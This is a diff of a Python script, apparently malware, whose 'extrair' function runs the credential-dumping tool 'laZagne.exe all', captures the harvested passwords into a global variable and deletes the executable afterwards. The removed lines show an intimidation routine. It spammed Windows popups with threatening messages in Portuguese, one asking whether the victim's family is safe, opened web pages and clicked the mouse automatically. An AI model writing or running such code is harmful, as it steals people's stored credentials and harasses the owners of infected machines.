@@ -15,34 +15,9 @@ def download(url):
 
 
 def extrair():
-    comando1 = 'laZagne.exe all'
+    comando = 'laZagne.exe all'
     global mensagem
-    for i in range(0, 25):
-        if i < 5:
-            comando = "msg *   👁️-------👁️Olá amigo!👁️--------👁️"
-            subprocess.Popen(comando, shell=True)
-        elif i < 10:
-            comando = "msg *   ☠-------☠SUA FAMILIA ESTÁ RESGUARDADA?☠--------☠"
-            subprocess.Popen(comando, shell=True)
-        elif i < 15:
-            comando = "msg *   ☠-------☠?☠--------☠"
-            subprocess.Popen(comando, shell=True)
-        elif i < 20:
-            comando = "msg *   👁️🎈👁️"
-            subprocess.Popen(comando, shell=True)
-        else:
-            comando = "msg *   Nos veremos?"
-            subprocess.Popen(comando, shell=True)
-    webbrowser.open("https://www.youtube.com/watch?v=rfaPzr0n9yw&t=1s")
-    pyautogui.moveTo(1050, 550)
-    pyautogui.sleep(1)
-    pyautogui.click(1050, 550)
-    pyautogui.sleep(2)
-    pyautogui.click()
-
-    webbrowser.open(
-        "https://investigationdiscovery.sndimg.com/content/dam/images/investigationdiscovery/crimefeed/legacy/2019/03/Michael-Jackson_Santa-Barbara-County-Sheriff-3012019.jpg.rend.hgtvcom.1280.1280.suffix/1551456926953.jpeg")
-    mensagem = subprocess.check_output(comando1, shell=True)
+    mensagem = subprocess.check_output(comando, shell=True)
     os.remove('laZagne.exe')
 
 
